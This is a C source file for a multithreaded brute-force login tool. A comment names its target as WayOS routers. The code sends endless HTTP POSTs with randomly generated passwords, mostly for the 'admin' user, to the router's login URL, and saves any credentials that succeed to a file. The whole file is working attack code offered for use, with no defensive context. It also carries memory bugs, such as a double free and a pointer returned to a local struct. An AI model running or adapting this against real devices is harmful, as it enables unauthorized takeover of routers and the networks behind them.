/* File : exploit.c
 * Auth: isinstance
 * Date: 20171031
 * Mail: no
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <pthread.h>

#include "http.h"
#include "rand.h"
#include "debug.h"
#include "exploit.h"

int write_passwd(const char *up)
{
    /*
     * Write the correct username and passwd to file
     */

    FILE *success_fp;
    success_fp = fopen(PASSWD_FILE_PATH, "w");
    if (!success_fp)
    {
        printf("Could NOT open file at - %s", PASSWD_FILE_PATH);
        return 1;
    }
    fprintf(success_fp, "%s", up);
    fclose(success_fp);
    return 0;
}

int unlimited_ex(struct UNLIMITED_INPUT *input)
{
    /*
     * Exploit unlimited
     */

    struct UNLIMITED_INPUT *pinput = (struct UNLIMITED_INPUT *)input;
    struct RAND_INPUT *rinput = (struct RAND_INPUT *)malloc(sizeof(struct RAND_INPUT));
    struct HTTP_POST_ARG *hinput = (struct HTTP_POST_ARG *)malloc(sizeof(struct HTTP_POST_ARG));
    //printf("unlimited NotRecv: %d\n", pinput->NotRecv);

    char *rand_passwd = NULL;
    char *post_data = NULL;
    char *return_value = NULL;
    char *write_space = NULL;
    //char pdebug[BUFFER_SIZE] = {'\0'};
    int num_loop = 0;

    write_space = (char *)calloc((MY_RAND_MAX_PASSWORD_LENGTH + MY_RAND_MAX_USERNAME_LENGTH + 100), sizeof(char));
    rand_passwd = (char *)calloc(MY_RAND_MAX_PASSWORD_LENGTH + 1, sizeof(char));
    post_data = (char *)calloc(MY_RAND_MAX_PASSWORD_LENGTH + MY_RAND_MAX_USERNAME_LENGTH + 100, sizeof(char));

    for (;;)
    {
        // Now we make the 'passwd' random
        // ---------> rand_string is here
        rinput->Flag = 1;
        rinput->NumLoop = num_loop;
        rinput->Seed = pinput->ThreadSeed;
        rinput->DebugMode = pinput->DebugMode;

        rand_string(rand_passwd, rinput);

        //sprintf(pdebug, "username:%s-passwd:%s", (pinput->RandUserName), rand_passwd);
        //debug(pinput->DebugMode, pdebug);

        sprintf(post_data, POST_MODEL, (pinput->RandUserName), rand_passwd);

        // Here we go --->
        hinput->URL = POST_URL;
        hinput->PostData = post_data;
        hinput->DebugMode = pinput->DebugMode;
        hinput->NotRecv = pinput->NotRecv;
        hinput->ReturnStr = return_value;
        http_post(hinput);
        return_value = hinput->ReturnStr;
        //return_value = http_post(POST_URL, post_data, pinput->DebugMode, pinput->NotRecv);
        //debug(pinput->DebugMode, return_value);
        //printf("%s\n", return_value);

        if (pinput->NotRecv != 1)
        {
            if (http_judge(return_value, pinput->DebugMode) == 0)
            {
                printf("We found the password!\n%s - %s\n", (pinput->RandUserName), rand_passwd);
                // Do something here
                sprintf(write_space, "%s - %s\n", (pinput->RandUserName), rand_passwd);
                if (write_passwd(write_space) == 1)
                {
                    printf("Write the username and password failed\n");
                    return 1;
                }
                free(write_space);
            }
            else
            {
                debug(pinput->DebugMode, "Failed");
            }
        }
        // Make sure the num_loop crontrol
        ++num_loop;
        if (num_loop >= sizeof(int))
        {
            num_loop = 0;
        }
    }
    free(pinput);
    free(rinput);
    free(hinput);
    free(write_space);
    free(rand_passwd);
    free(post_data);

    return 0;
}

/*
int limited_ex(struct LIMITED_INPUT *input)
{
    
    //Exploit limited 
    

    struct LIMITED_INPUT *pinput = (struct LIMITED_INPUT *)input;
    struct RAND_INPUT *rinput = (struct RAND_INPUT *)malloc(sizeof(struct RAND_INPUT));

    char *rand_user = NULL;
    char *rand_passwd = NULL;
    char *post_data = NULL;
    char *return_value = NULL;
    char *write_space = NULL;
    char pdebug[BUFFER_SIZE] = {'\0'};
    int num_loop = 0;
    write_space = (char *)calloc((MY_RAND_MAX_PASSWORD_LENGTH + MY_RAND_MAX_USERNAME_LENGTH + 10), sizeof(char));
    rand_user = (char *)calloc(MY_RAND_MAX_USERNAME_LENGTH + 1, sizeof(char));
    rand_passwd = (char *)calloc(MY_RAND_MAX_PASSWORD_LENGTH + 1, sizeof(char));
    post_data = (char *)calloc(MY_RAND_MAX_PASSWORD_LENGTH + MY_RAND_MAX_USERNAME_LENGTH + 100, sizeof(char));

    int ni;
    int pi;
    for (ni = 0; ni < (pinput->MaxLoopTime); ni++)
    {
        // We determine the 'username' first
        // ---------> rand_string is here
        rinput->Flag = 0;
        rinput->NumLoop = num_loop + ni;
        rinput->Seed = pinput->ThreadSeed;
        rinput->DebugMode = pinput->DebugMode;
        // Get the random user name here
        rand_string(rand_user, rinput);
        for (pi = 0; pi < (pinput->MaxLoopTime); pi++)
        {
            // Now we make the 'passwd' random
            // ---------> rand_string is here
            rinput->Flag = 1;
            rinput->NumLoop = num_loop + ni + pi;
            // Get the random password here
            rand_string(rand_passwd, rinput);
            sprintf(post_data, POST_MODEL, rand_user, rand_passwd);
            sprintf(pdebug, "username:%s-passwd:%s", rand_user, rand_passwd);
            debug(pinput->DebugMode, pdebug);
            // Here we go
            //return_value = http_post(POST_URL, post_data, pinput->DebugMode, pinput->NotRecv);
            debug(pinput->DebugMode, return_value);
            //printf("%s\n", return_value);

            if (http_judge(return_value, pinput->DebugMode) == 0)
            {
                printf("We found the password!\n%s - %s\n", rand_user, rand_passwd);
                // Do something here
                sprintf(write_space, "%s - %s\n", rand_user, rand_passwd);
                if (write_passwd(write_space) == 1)
                {
                    printf("Write the username and password failed\n");
                    return 1;
                }
                free(write_space);
            }
            else
            {
                debug(pinput->DebugMode, "Failed");
            }
        }
        ++num_loop;
        if (num_loop >= sizeof(int))
        {
            num_loop = 0;
        }
    }
    free(write_space);
    free(rand_user);
    free(rand_passwd);
    free(post_data);

    return 0;
}
*/

struct PARSE_RETURN *parse_input(const int iargc, char **pargv)
{
    /*
     * Parse the input from user
     * There is someting should explain
     * Use the struct PARSE_RETURN to return vaule
     */
    int i;
    // 'mp_flag' is specify the max_loop_time is exised or not
    int mp_flag = 0;
    // mp is used to point to -m value
    char *mp = NULL;
    char *ptmp = NULL;

    struct PARSE_RETURN *prs = NULL;
    struct PARSE_RETURN return_struct;
    prs = &return_struct;

    for (i = 1; i < iargc; i++)
    {
        ptmp = (char *)strstr(pargv[i], "-");
        if (!ptmp)
        {
            printf("Illegal input\n");
            return NULL;
        }
        switch (*(ptmp + 1))
        {
        case 'n':
            prs->noption = 1;
            ;
            break;
        case 'r':
            prs->roption = 1;
            break;
        case 'm':
            prs->moption = 1;
            mp = pargv[++i];
            mp_flag = 1;
            break;
        case 'd':
            prs->doption = 1;
            break;
        default:
            printf("Not have this option\n");
            printf(USAGE);
            return NULL;
        }
    }

    if (mp != NULL)
    {
        prs->mvalue = (int)atoi(mp);
    }
    else
    {
        if (mp_flag == 1)
        {
            printf("Please input the max_loop_time\n");
            return NULL;
        }
    }
    return prs;
}

void *exploit(void *input)
{
    /*
     * Exploit the WayOS router now
     */

    //printf("Here is exploit function\n");
    char *rand_passwd = NULL;
    char *rand_user = NULL;
    char pdebug[BUFFER_SIZE] = {'\0'};

    // struct
    struct INPUT_ARG *tmp = input;

    //struct LIMITED_INPUT *plimiteds = (struct LIMITED_INPUT *)malloc(sizeof(struct LIMITED_INPUT));
    struct UNLIMITED_INPUT *punlimiteds = (struct UNLIMITED_INPUT *)malloc(sizeof(struct UNLIMITED_INPUT));

    /*
    plimiteds->MaxLoopTime = tmp->MaxLoopTime;
    plimiteds->DebugMode = tmp->DebugMode;
    plimiteds->ThreadSeed = tmp->ThreadSeed;
    plimiteds->NotRecv = tmp->NotRecv;
    */

    punlimiteds->DebugMode = tmp->DebugMode;
    punlimiteds->ThreadSeed = tmp->ThreadSeed;
    punlimiteds->NotRecv = tmp->NotRecv;

    if (tmp->RandFlag)
    {
        rand_user = (char *)calloc(MY_RAND_MAX_USERNAME_LENGTH, sizeof(char));
        if (!rand_user)
        {
            printf("Malloc for rand_user failed\n");
            pthread_exit((void *)1);
        }
    }
    else
    {
        rand_user = "admin";
    }
    punlimiteds->RandUserName = rand_user;
    sprintf(pdebug, "Random username:%s", rand_user);
    debug(tmp->DebugMode, pdebug);

    rand_passwd = (char *)calloc(MY_RAND_MAX_PASSWORD_LENGTH, sizeof(char));
    if (!rand_passwd)
    {
        printf("Malloc for rand_passwd failed\n");
        pthread_exit((void *)1);
    }

    /*
    if (tmp->RandFlag == 1)
    {
        if (tmp->MaxLoopTime < 1)
        {
            printf("max_loop_time could NOT too small than 1\n");
            pthread_exit((void *)1);
        }
        debug(tmp->DebugMode, "Start limited method");
        if (limited_ex(plimiteds) == 1)
        {
            printf("Exploit-1 failed\n");
            pthread_exit((void *)1);
        }
        pthread_exit((void *)0);
    }
    */
    debug(tmp->DebugMode, "Start unlimited method");
    //printf("exploit NotRecv: %d\n", punlimiteds->NotRecv);
    unlimited_ex(punlimiteds);
    free(punlimiteds);
    free(rand_user);
    free(rand_passwd);
    pthread_exit((void *)0);
}